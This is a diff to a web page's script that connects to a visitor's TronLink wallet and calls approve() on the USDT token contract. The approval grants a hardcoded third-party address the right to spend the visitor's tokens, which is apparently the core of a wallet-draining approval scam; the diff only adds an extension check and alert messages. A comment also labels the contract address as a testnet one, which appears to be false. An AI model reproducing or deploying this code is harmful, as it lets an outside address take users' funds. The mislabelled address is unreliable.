@@ -133,35 +133,40 @@
 </script>
 
 <script>
-  async function authorizeTronUsdt() {
-      try {
-          const tronLink = window.tronLink; // 使用连接好的 TronLink
-          
-          await tronLink.request({ method: 'tron_requestAccounts' });
-
-          const recipientAddress = 'TThzxNRLrW2Brp9DcTQU8i4Wd9udCWEdZ3'; // 接收地址
-          const tokenContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Shasta 测试网 USDT 合约地址
-          const amount = 100000; // 授权的 USDT 数量（单位是最小单位）
-
-          const accounts = await tronLink.request({ method: 'tron_requestAccounts' });
-          const fromAddress = accounts[0];
-
-          // 获取 TRON 网络的合约
-          const contract = await tronLink.contract().at(tokenContractAddress);
-          
-          // 执行授权
-          const result = await contract.methods.approve(recipientAddress, amount).send({ from: fromAddress });
-          
-          if (result.result) {
-              console.log('授权成功！');
-          } else {
-              console.log('授权失败！');
-          }
-      } catch (error) {
-          console.error('发生错误，请查看控制台：', error);
+    async function authorizeTronUsdt() {
+      if (typeof window.TronLink === 'undefined') {
+        alert('请安装 TRONLink 扩展！');
+        return;
       }
-  }
-</script>
+
+      try {
+        const tronLink = window.TronLink;
+        await tronLink.request({ method: 'tron_requestAccounts' });
+
+        const recipientAddress = 'TThzxNRLrW2Brp9DcTQU8i4Wd9udCWEdZ3'; // 接收地址
+        const tokenContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Shasta 测试网 USDT 合约地址
+        const amount = 100000; // 授权的 USDT 数量（单位是最小单位）
+
+        const accounts = await tronLink.request({ method: 'tron_requestAccounts' });
+        const fromAddress = accounts[0];
+
+        // 获取 TRON 网络的合约
+        const contract = await tronLink.contract().at(tokenContractAddress);
+        
+        // 执行授权
+        const result = await contract.methods.approve(recipientAddress, amount).send({ from: fromAddress });
+        
+        if (result.result) {
+          alert('授权成功！');
+        } else {
+          alert('授权失败！');
+        }
+      } catch (error) {
+        console.error(error);
+        alert('发生错误，请查看控制台。');
+      }
+    }
+  </script>
 
 </body>
 
